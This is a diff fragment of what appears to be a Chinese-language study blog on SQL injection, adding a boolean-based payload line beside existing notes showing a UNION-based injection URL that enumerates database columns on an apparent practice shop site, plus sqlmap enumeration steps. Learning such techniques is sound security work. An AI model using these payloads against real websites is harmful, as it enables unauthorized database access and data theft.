@@ -129,6 +129,7 @@
 <p><a href="http://shop.aqlab.cn:8001/single.php?id=1&#39;" target="_blank" rel="noopener">http://shop.aqlab.cn:8001/single.php?id=1&#39;</a> and 1=2 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’cakes’ limit 2,1</p>
 <h3 id="sqlmap-get"><a href="#sqlmap-get" class="headerlink" title="sqlmap get"></a>sqlmap get</h3><p>python sqlmap -u *** </p>
 <p>先跑数据库 –dbms=***(跑出的数据库类型) 再跑表–tables 再跑列 -T “user” –columns 再跑字段 –C “username,….”</p>
+<p>‘ or length(database())&gt;100– adfa</p>
 
       
     </div>
